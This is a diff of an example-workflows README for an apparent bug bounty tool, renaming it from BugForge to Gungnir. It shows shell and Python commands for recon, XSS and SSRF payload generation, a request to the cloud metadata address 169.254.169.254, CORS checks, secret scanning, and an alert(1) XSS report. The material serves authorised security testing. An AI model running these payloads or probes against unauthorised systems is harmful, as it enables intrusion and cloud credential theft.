@@ -1,7 +1,7 @@
-# BugForge Examples
+# Gungnir Examples
 
 Practical, copy-pasteable workflows for common bug bounty tasks.
-**Always run `bugforge scope check` first.**
+**Always run `gungnir scope check` first.**
 
 ## 1. Full recon pass on a scoped program
 
@@ -15,31 +15,31 @@ out_of_scope:
 EOF
 
 # 1. Validate a few targets
-bugforge scope check --brief brief.txt \
+gungnir scope check --brief brief.txt \
   --target https://app.example.com --target https://staging.example.com
 
 # 2. Enumerate subdomains (filtered to scope), resolve to IPs
-bugforge recon subdomains --domain example.com --resolve --scope brief.txt --out subs.txt
+gungnir recon subdomains --domain example.com --resolve --scope brief.txt --out subs.txt
 
 # 3. Fingerprint each live subdomain's stack + security headers
 while read -r sub; do
-  bugforge recon fingerprint --url "https://$sub" --audit
+  gungnir recon fingerprint --url "https://$sub" --audit
 done < subs.txt
 
 # 4. Discover interesting endpoints
-bugforge recon content --url https://app.example.com --status 200,301,302,401,403
+gungnir recon content --url https://app.example.com --status 200,301,302,401,403
 ```
 
 ## 2. XSS payload generation + reflection testing
 
 ```bash
 # Generate a full mutated wordlist
-bugforge vulns xss --generate --out xss.txt
+gungnir vulns xss --generate --out xss.txt
 
 # Then use your fuzzer of choice (ffuf, etc.) or test reflection in library mode:
 python -c "
-from bugforge.vulns.xss import XssPayloadGen
-from bugforge.utils.http import HttpClient
+from gungnir.vulns.xss import XssPayloadGen
+from gungnir.utils.http import HttpClient
 gen = XssPayloadGen()
 client = HttpClient()
 for p in gen.generate(mutate=True):
@@ -53,13 +53,13 @@ for p in gen.generate(mutate=True):
 
 ```bash
 # Spin up an interactsh callback host, then:
-bugforge vulns ssrf --metadata --bypass --callback YOUR.interact.sh --out ssrf.txt
+gungnir vulns ssrf --metadata --bypass --callback YOUR.interact.sh --out ssrf.txt
 
 # Feed the payloads into your SSRF target's URL parameter and watch for callbacks.
 # To check whether a fetched response reveals internal details:
 python -c "
-from bugforge.vulns.ssrf import SsrfHelper
-from bugforge.utils.http import HttpClient
+from gungnir.vulns.ssrf import SsrfHelper
+from gungnir.utils.http import HttpClient
 h = SsrfHelper()
 r = HttpClient().get('https://app.example.com/fetch?url=http://169.254.169.254/latest/meta-data/')
 print(h.detect_internal_indicators(r.text))
@@ -71,7 +71,7 @@ print(h.detect_internal_indicators(r.text))
 ```bash
 for sub in $(cat subs.txt); do
   echo "=== $sub ==="
-  bugforge vulns cors --url "https://$sub/api"
+  gungnir vulns cors --url "https://$sub/api"
 done
 ```
 
@@ -79,19 +79,19 @@ done
 
 ```bash
 # Scan a saved HTTP response, any config file, or a JS bundle:
-bugforge vulns secrets --file response.txt --json > findings.json
-bugforge vulns secrets --file app.js
+gungnir vulns secrets --file response.txt --json > findings.json
+gungnir vulns secrets --file app.js
 ```
 
 ## 6. Generate a payout-ready report
 
 ```bash
-bugforge report xss \
+gungnir report xss \
   --url 'https://app.example.com/search?q=<script>alert(1)</script>' \
   --payload '<script>alert(1)</script>' \
   --reporter '@yourhandle' \
   --out reports/xss-search.md
 
 # Compute the CVSS score for your own vector:
-bugforge report cvss --vector 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N'
+gungnir report cvss --vector 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N'
 ```
